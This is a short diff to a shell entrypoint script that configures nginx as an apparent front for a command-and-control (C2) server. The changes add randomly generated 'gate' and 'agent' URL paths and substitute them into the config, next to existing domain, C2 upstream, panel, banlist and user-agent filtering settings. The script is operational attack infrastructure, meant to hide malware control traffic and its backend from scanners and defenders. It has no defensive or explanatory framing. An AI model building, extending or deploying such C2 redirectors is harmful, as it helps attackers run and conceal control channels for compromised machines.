@@ -24,9 +24,15 @@ touch /etc/nginx/banlist.conf /etc/nginx/agent_routes.conf 2>/dev/null || true
 
 echo "[entrypoint] Configuring nginx for $DOMAIN_NAME → $C2_SERVER"
 
+GATE_BASE="${GATE_BASE_PATH:-/g$(head -c 200 /dev/urandom | tr -dc 'a-z0-9' | head -c 4)/}"
+AGENT_BASE="${AGENT_BASE_PATH:-/a$(head -c 200 /dev/urandom | tr -dc 'a-z0-9' | head -c 4)/}"
+echo "[entrypoint] Gate base $GATE_BASE, agent base $AGENT_BASE"
+
 sed -i "s/<DOMAIN_NAME>/$(printf '%s' "$DOMAIN_NAME" | sed 's/[\/&]/\\&/g')/g" "$CONF"
 sed -i "s/<C2_SERVER>/$(printf '%s'   "$C2_SERVER"   | sed 's/[\/&]/\\&/g')/g" "$CONF"
 sed -i "s/<C2_SCHEME>/$C2_SCHEME/g" "$CONF"
+sed -i "s|<GATE_BASE>|$(printf '%s' "$GATE_BASE" | sed 's/[\/&]/\\&/g')|g" "$CONF"
+sed -i "s|<AGENT_BASE>|$(printf '%s' "$AGENT_BASE" | sed 's/[\/&]/\\&/g')|g" "$CONF"
 sed -i "s/<PANEL_UPSTREAM>/$(printf '%s' "$PANEL_UPSTREAM" | sed 's/[\/&]/\\&/g')/g" "$CONF"
 
 if [ -n "$UA_PATTERN" ]; then
